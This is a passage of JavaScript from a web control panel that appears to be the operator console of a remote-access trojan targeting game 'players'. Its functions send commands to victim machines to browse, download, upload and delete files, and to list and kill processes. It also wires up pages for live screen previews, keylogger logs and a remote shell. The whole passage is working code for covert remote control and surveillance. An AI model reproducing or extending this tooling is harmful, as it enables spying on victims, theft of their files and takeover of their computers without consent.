                'jpg': 'fa-file-image', 'jpeg': 'fa-file-image', 'png': 'fa-file-image', 'gif': 'fa-file-image', 'bmp': 'fa-file-image',
                'mp3': 'fa-file-audio', 'wav': 'fa-file-audio', 'ogg': 'fa-file-audio',
                'mp4': 'fa-file-video', 'avi': 'fa-file-video', 'mkv': 'fa-file-video', 'mov': 'fa-file-video',
                'zip': 'fa-file-archive', 'rar': 'fa-file-archive', '7z': 'fa-file-archive', 'tar': 'fa-file-archive', 'gz': 'fa-file-archive',
                'exe': 'fa-cog', 'msi': 'fa-cog', 'bat': 'fa-cog', 'cmd': 'fa-cog',
                'js': 'fa-file-code', 'py': 'fa-file-code', 'java': 'fa-file-code', 'cpp': 'fa-file-code', 'c': 'fa-file-code', 'h': 'fa-file-code',
                'html': 'fa-file-code', 'css': 'fa-file-code', 'json': 'fa-file-code', 'xml': 'fa-file-code',
                'dll': 'fa-puzzle-piece', 'so': 'fa-puzzle-piece',
                'jar': 'fa-coffee'
            };
            return icons[ext] || 'fa-file';
        }
        
        function formatFileSize(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
        }
        
        function navigateToFolder(path) {
            document.getElementById('currentPath').value = path;
            browseToPath();
        }

        function goUpDirectory() {
            const path = document.getElementById('currentPath').value;
            const parts = path.split(/[\\\/]/).filter(p => p);
            if (parts.length > 1) {
                parts.pop();
                document.getElementById('currentPath').value = parts.join('\\');
            } else {
                document.getElementById('currentPath').value = 'C:\\';
            }
            browseToPath();
        }
        
        function goToHome() {
            document.getElementById('currentPath').value = 'C:\\Users';
            browseToPath();
        }
        
        function goToDesktop() {
            document.getElementById('currentPath').value = '%USERPROFILE%\\Desktop';
            browseToPath();
        }
        
        async function downloadRemoteFile(path) {
            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) return;
            
            toast('Requesting file download...');
            
            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'files',
                command_data: 'download|' + path
            });
            
            if (res.success && res.id) {
                pollDownloadResult(res.id, path);
            }
        }
        
        async function pollDownloadResult(commandId, originalPath) {
            let attempts = 0;
            const maxAttempts = 60; // 30 seconds for large files
            
            const poll = async () => {
                attempts++;
                const res = await api(`/api/remote/command/${commandId}`);
                
                if (res.success && res.command && res.command.status === 'completed') {
                    try {
                        const data = JSON.parse(res.command.result);
                        if (data.error) {
                            toast('Download failed: ' + data.error, 'error');
                        } else if (data.data) {
                            // Create download
                            const blob = base64ToBlob(data.data);
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = data.filename || 'download';
                            a.click();
                            URL.revokeObjectURL(url);
                            toast('File downloaded: ' + data.filename);
                        }
                    } catch(e) {
                        toast('Failed to parse download', 'error');
                    }
                    return;
                }
                
                if (attempts < maxAttempts) {
                    setTimeout(poll, 500);
                } else {
                    toast('Download timeout', 'error');
                }
            };
            
            poll();
        }
        
        function base64ToBlob(base64) {
            const binary = atob(base64);
            const bytes = new Uint8Array(binary.length);
            for (let i = 0; i < binary.length; i++) {
                bytes[i] = binary.charCodeAt(i);
            }
            return new Blob([bytes]);
        }
        
        async function previewFile(path) {
            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) return;
            
            document.getElementById('filePreview').style.display = 'block';
            document.getElementById('previewFileName').textContent = path.split('\\').pop();
            document.getElementById('filePreviewContent').textContent = 'Loading...';
            
            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'files',
                command_data: 'download|' + path
            });
            
            if (res.success && res.id) {
                pollPreviewResult(res.id);
            }
        }
        
        async function pollPreviewResult(commandId) {
            let attempts = 0;
            const maxAttempts = 30;
            
            const poll = async () => {
                attempts++;
                const res = await api(`/api/remote/command/${commandId}`);
                
                if (res.success && res.command && res.command.status === 'completed') {
                    try {
                        const data = JSON.parse(res.command.result);
                        if (data.error) {
                            document.getElementById('filePreviewContent').textContent = 'Error: ' + data.error;
                        } else if (data.data) {
                            const text = atob(data.data);
                            document.getElementById('filePreviewContent').textContent = text.substring(0, 50000); // Limit preview
                        }
                    } catch(e) {
                        document.getElementById('filePreviewContent').textContent = 'Failed to load preview';
                    }
                    return;
                }
                
                if (attempts < maxAttempts) {
                    setTimeout(poll, 500);
                }
            };
            
            poll();
        }
        
        function closeFilePreview() {
            document.getElementById('filePreview').style.display = 'none';
        }
        
        async function deleteRemoteFile(path) {
            if (!confirm('Delete ' + path + '?')) return;
            
            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) return;
            
            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'files',
                command_data: 'delete|' + path
            });
            
            if (res.success) {
                toast('Delete command sent');
                setTimeout(() => browseToPath(), 1000);
            }
        }
        
        async function createNewFolder() {
            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) {
                toast('Select a player first', 'error');
                return;
            }
            
            const name = prompt('New folder name:');
            if (!name) return;
            
            const path = document.getElementById('currentPath').value + '\\' + name;
            
            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'files',
                command_data: 'mkdir|' + path
            });
            
            if (res.success) {
                toast('Creating folder: ' + name);
                setTimeout(() => browseToPath(), 1000);
            }
        }
        
        function uploadFileDialog() {
            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) {
                toast('Select a player first', 'error');
                return;
            }
            document.getElementById('fileUploadInput').click();
        }
        
        async function handleFileUpload(event) {
            const file = event.target.files[0];
            if (!file) return;
            
            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) return;
            
            // Max 10MB
            if (file.size > 10 * 1024 * 1024) {
                toast('File too large (max 10MB)', 'error');
                return;
            }
            
            const reader = new FileReader();
            reader.onload = async (e) => {
                const base64 = btoa(new Uint8Array(e.target.result).reduce((data, byte) => data + String.fromCharCode(byte), ''));
                const destPath = document.getElementById('currentPath').value + '\\' + file.name;
                
                toast('Uploading ' + file.name + '...');
                
                const res = await api('/api/remote/command', 'POST', {
                    target_player: player,
                    command_type: 'files',
                    command_data: 'upload|' + destPath + '|' + base64
                });
                
                if (res.success) {
                    toast('Upload command sent');
                    setTimeout(() => browseToPath(), 2000);
                }
            };
            reader.readAsArrayBuffer(file);
            
            // Reset input
            event.target.value = '';
        }

        function refreshFileList() {
            browseToPath();
        }

        // ==================== PAGE NAVIGATION HOOKS ====================
        const originalShowPage = showPage;
        showPage = function(page) {
            originalShowPage(page);
            
            // Stop preview auto-refresh when leaving screenshare
            if (page !== 'screenshare') {
                stopPreviewAutoRefresh();
            }
            
            // Load data for specific pages
            if (page === 'remote') {
                loadOnlinePlayersForRemote();
            } else if (page === 'screenshare') {
                loadLivePreviewGrid();
                loadScreenshotHistory();
                startPreviewAutoRefresh();
            } else if (page === 'keylogger') {
                loadOnlinePlayersForRemote();
                loadKeylogs();
            } else if (page === 'processes') {
                loadOnlinePlayersForRemote();
            } else if (page === 'shell') {
                loadOnlinePlayersForRemote();
                loadShellHistory();
            } else if (page === 'files') {
                loadOnlinePlayersForRemote();
            }
        };

        // ==================== PROCESS MANAGER ====================
        async function refreshProcessList() {
            const player = document.getElementById('processPlayerSelect').value;
            if (!player) {
                toast('Please select a player', 'error');
                return;
            }
            
            document.getElementById('processListTable').innerHTML = '<tr><td colspan="3" style="text-align:center; padding: 40px;"><i class="fas fa-spinner fa-spin"></i> Loading processes...</td></tr>';
            
            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'process_manager',
                command_data: 'list'
            });
            
            if (res.success && res.id) {
                pollProcessResult(res.id);
            }
        }
        
        async function pollProcessResult(commandId) {
            let attempts = 0;
            const maxAttempts = 30;
            
            const poll = async () => {
                attempts++;
                const res = await api(`/api/remote/command/${commandId}`);
                
                if (res.success && res.command && res.command.status === 'completed') {
                    try {
                        const data = JSON.parse(res.command.result);
                        if (data.error) {
                            document.getElementById('processListTable').innerHTML = `<tr><td colspan="3" style="text-align:center; color: var(--danger);">Error: ${data.error}</td></tr>`;
                        } else if (data.processes) {
                            renderProcessList(data.processes);
                        }
                    } catch(e) {
                        document.getElementById('processListTable').innerHTML = `<tr><td colspan="3" style="text-align:center; color: var(--danger);">Failed to parse process list</td></tr>`;
                    }
                    return;
                }
                
                if (attempts < maxAttempts) {
                    setTimeout(poll, 500);
                } else {
                    document.getElementById('processListTable').innerHTML = `<tr><td colspan="3" style="text-align:center; color: var(--warning);">Timeout waiting for client</td></tr>`;
                }
            };
            
            poll();
        }
        
        function renderProcessList(processes) {
            if (!processes || processes.length === 0) {
                document.getElementById('processListTable').innerHTML = '<tr><td colspan="3" style="text-align:center;">No processes found</td></tr>';
                return;
            }
            
            // Sort by name
            processes.sort((a, b) => a.name.localeCompare(b.name));
            
            document.getElementById('processListTable').innerHTML = processes.map(p => `
                <tr>
                    <td style="font-family: monospace;">${p.pid}</td>
                    <td>${escapeHtml(p.name)}</td>
                    <td>
                        <button class="btn btn-xs btn-danger" onclick="killProcess('${p.pid}', '${escapeHtml(p.name).replace(/'/g, "\\'")}')">
                            <i class="fas fa-skull"></i> Kill
                        </button>
                    </td>
                </tr>
            `).join('');
            
            document.getElementById('processManagerStatus').innerHTML = `<i class="fas fa-check" style="color: #22c55e;"></i> Loaded ${processes.length} processes`;
        }
        
        async function killProcess(pid, name) {
            if (!confirm(`Are you sure you want to kill process ${name} (PID: ${pid})?`)) return;
            
            const player = document.getElementById('processPlayerSelect').value;
            if (!player) return;
            
            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'process_manager',
                command_data: 'kill|' + pid
            });
            
            if (res.success) {
                toast(`Kill command sent for PID ${pid}`);
                // Refresh after delay
                setTimeout(() => refreshProcessList(), 2000);
            }
        }

        // Init
        (async () => {
            if (await checkAuth()) {
                showApp();
            }
            // Initialize Christmas effects
        })();

        // Close modal on outside click
        document.getElementById('modal').addEventListener('click', e => {
            if (e.target.id === 'modal') closeModal();
        });

        // INIT - Check if already logged in
        window.addEventListener('load', async () => {
            if (token) {
                if (await checkAuth()) {
                    showApp();
                } else {
                    logout();
                }
            }
        });
    </script>
</body>
</html>